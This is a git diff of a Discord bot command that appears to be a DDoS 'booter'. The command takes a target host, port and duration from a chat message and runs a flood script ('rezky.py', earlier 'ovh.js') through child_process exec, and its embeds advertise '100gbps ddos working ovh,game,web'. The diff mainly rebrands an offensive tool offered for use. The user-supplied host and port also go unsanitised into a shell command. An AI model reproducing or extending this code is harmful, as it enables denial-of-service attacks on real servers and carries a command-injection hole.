@@ -16,16 +16,16 @@ if (message.channel.id != room) {
 if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('ATTACK BY EL CRAXSRAT')
-	.setDescription("`example .ovh 1.1.1.1 22 90`")
-	.setFooter("pls don't attack .gov .edu")
+	.setTitle('WARRING')
+	.setDescription("`example .Ven100gbps 1.1.1.1 22 60`")
+	.setFooter("100gbps ddos working ovh,game,web")
 	message.channel.send(embed1);
 	return;
 	}
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node ovh.js ${host} ${port} 65500 ${duration} 800`, (error, stdout, stderr) => {
+exec(`python3 rezky.py ${host} ${port} 1024 ${duration}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -34,10 +34,10 @@ setTimeout(function(){
 
 const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('🚀 **ATTACK BY CRAXSRAT** 🚀')
+	.setTitle('🚀 **100GBPS** 🚀')
 	.setTimestamp()
-  .setDescription("**Host** : `" + host + "` \n **Port** : `" + port + "` \n **Methods** : `OVH 💣` \n **Time** : `" + duration + "`")
-	.setFooter('© Developer: ROMEO', client.user.avatarURL)
+  .setDescription("**Host** : `" + host + "` \n **Port** : `" + port + "` \n **Methods** : `100GBPS 💣` \n **Time** : `" + duration + "`")
+	.setFooter('© Developer: ZINOU', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(attackgif)
 	.setThumbnail("")
@@ -56,9 +56,9 @@ var gify = ["https://media.giphy.com/media/6036p0cTnjUrNFpAlr/giphy.gif"];
 console.log('Start Verify ID Discord:' +  message.guild.id)
 const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('🚀 **ATTACK BY CRAXSRAT** 🚀')
+	.setTitle('🚀 **Bot Loading** 🚀')
 	.setTimestamp()
-	.setDescription("**► Attack Loading **")
+	.setDescription("**► 𝓟𝓵𝓮𝓪𝓼𝓮 𝔀𝓪𝓲𝓽 𝓯𝓸𝓻 𝓿𝓮𝓻𝓲𝓯𝓲𝓬𝓪𝓽𝓲𝓸𝓷 **")
 	.setFooter('© Developer: ZINOU', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(loadinggif)
@@ -70,12 +70,12 @@ const embed = new Discord.MessageEmbed()
 exports.conf = {
   enabled: true,
   guildOnly: false,
-  aliases: ['ovh'],
+  aliases: ['Ven100gbps'],
   permLevel: 0
 }
 
 exports.help = {
-  name: 'ovh',
-  description: 'VenThings#3280',
-  usage: 'ovh'
+  name: 'Ven100gbps',
+  description: 'NgentodMC',
+  usage: 'Ven100gbps'
 }
